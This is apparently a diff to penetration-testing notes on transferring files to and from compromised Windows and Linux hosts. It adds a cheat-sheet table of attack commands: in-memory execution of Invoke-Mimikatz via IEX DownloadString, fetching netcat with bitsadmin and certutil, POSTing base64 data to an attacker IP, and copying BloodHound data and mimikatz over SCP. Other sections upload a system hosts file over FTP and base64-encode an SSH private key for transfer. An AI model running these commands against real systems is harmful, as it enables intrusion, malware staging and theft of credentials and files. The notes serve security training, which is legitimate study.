@@ -1,7 +1,21 @@
 
+| **Command**                                                                                                        | **Description**                             |
+| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
+| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            | Download a file with PowerShell             |
+| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
+| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
+| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
+| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |
+| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
+| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
+| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
+| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
+| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
+| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
+
 # Windows
 
-## Downloads
+## Download
 
 ### Base64
 
@@ -78,7 +92,7 @@ sudo python3 -m pyftpdlib --port 21
 (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
 
-## Uploads
+## Upload
 
 ### Base64
 
@@ -145,8 +159,36 @@ sudo python3 -m pyftpdlib --port 21 --write
 (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
-Create a command file for ftp clie
+Create a command file for ftp client
 
 ```bash
+cat > ftpcommand.txt << 'EOF'
+echo open 192.168.49.128
+echo USER anonymous
+echo binary
+echo PUT c:\windows\system32\drivers\etc\hosts
+echo bye
+EOF
 
+# connect
+ftp -v -n -s:ftpcommand.txt
 ```
+
+# Linux
+
+## Download
+
+### Base64
+
+```bash
+# encode
+cat id_rsa |base64 -w 0;echo
+
+# decode
+echo -n 'LS0....tLS==' | base64 -d > id_rsa
+
+# verify
+md5sum id_rsa
+```
+
+## Upload
